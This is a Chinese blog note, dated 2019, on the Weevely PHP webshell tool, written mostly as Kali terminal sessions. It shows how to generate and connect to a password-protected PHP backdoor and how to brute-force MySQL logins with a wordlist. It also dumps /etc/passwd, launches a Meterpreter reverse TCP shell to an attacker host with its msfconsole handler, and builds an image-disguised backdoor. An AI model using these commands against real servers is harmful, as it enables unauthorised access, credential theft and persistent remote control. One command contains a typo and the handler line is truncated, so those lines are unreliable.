---
title: php后门之weevely
date: 2019-04-14 22:30:39
tags:
    - weevely
    - 软件
categories:
    - 笔记总结
    - 软件运用
---
Weevely是一款python编写的webshell管理工具，作为编写语言使用python的一款工具，它最大的优点就在于跨平台，可以在任何安装过python的系统上使用。

### 基本用法
```bash
root@kali:~# weevely 

[+] weevely 3.2.0
[!] Error: too few arguments

[+] Run terminal to the target
    weevely <URL> <password> [cmd]

[+] Load session file
    weevely session <path> [cmd]

[+] Generate backdoor agent
    weevely generate <password> <path>
```
<!--more-->
### 生成一个后门
```bash
root@kali:~# weevely generate test hello.php
Generated backdoor with password 'test' in 'hello.php' of 1486 byte size.
root@kali:~# find / -name hello.php
/usr/share/weevely/hello.php
```

### 连接一个后门
```bash
root@kali:~# weevely http://192.168.110.129/hello.php test

[+] weevely 3.2.0

[+] Target: winxp-0947be9ad:C:\phpstudy\WWW
[+] Session:    /root/.weevely/sessions/192.168.110.129/hello_0.session
[+] Shell:  System shell

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely>
```

### 案例
1. 暴力破解SQL用户凭证
```bash
用户名为roblast micjanost pjgomes pdpeers root
:bruteforce_sql mysql -users roblast micjanost pjgomes pdpeers root -fpwds wordlists/huge.txt

使用:sql_console连接数据库
www-data@target:/var/www/html PHP> :sql_console -u root -p Gilchrist
root@localhost SQL> show databases;
+--------------------+
| mysql              |
| performance_schema |
| test               |
| appdb              |
+--------------------+
root@localhost SQL> 
```
2. 绕过策略读取/etc/passwd
```bash
www-data@target:/var/www/html PHP> :audit_etcpasswd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
yzer:x:1000:1000:yzer,,,:/home/yzer:/bin/bash
www-data@target:/var/www/html PHP>
```
3. 反弹msf的shell
```bash
# 执行该命令会自动生成msf的payload
:backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost 10.0.0.2
[-][meterpreter] Make sure the listener is running on another terminal as below
msfconsole -x "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 10.0.0.2;
```
4. 生成图片马
```bash
weevel generate.img <password> <img> [<floder_path>]
```
